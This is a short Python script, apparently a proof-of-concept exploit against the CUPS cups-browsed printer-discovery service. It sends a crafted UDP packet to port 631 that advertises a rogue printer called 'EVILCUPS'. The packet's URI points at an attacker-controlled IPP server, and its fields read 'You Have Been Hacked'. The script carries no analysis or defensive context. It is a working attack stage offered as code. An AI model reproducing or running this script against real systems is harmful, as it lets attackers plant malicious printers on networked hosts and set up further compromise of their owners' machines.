import socket

def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port):
    print(f"Sending udp packet to {ip}:{port}...")
    printer_type = 2
    printer_state = '3'
    printer_uri = f'http://{ipp_server_host}:{ipp_server_port}/printers/EVILCUPS'
    printer_location = '"You Have Been Hacked"'
    printer_info = '"HACKED"'
    printer_model = '"HP LaserJet 1020"'
    packet = f"{printer_type:x} {printer_state} {printer_uri} {printer_location} {printer_info} {printer_model} \n"
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet.encode('utf-8'), (ip, port))

if __name__ == "__main__": 
    TARGET_HOST = "127.0.0.1"
    TARGET_PORT = 631
    send_browsed_packet(TARGET_HOST, TARGET_PORT, "192.168.37.142", "12345")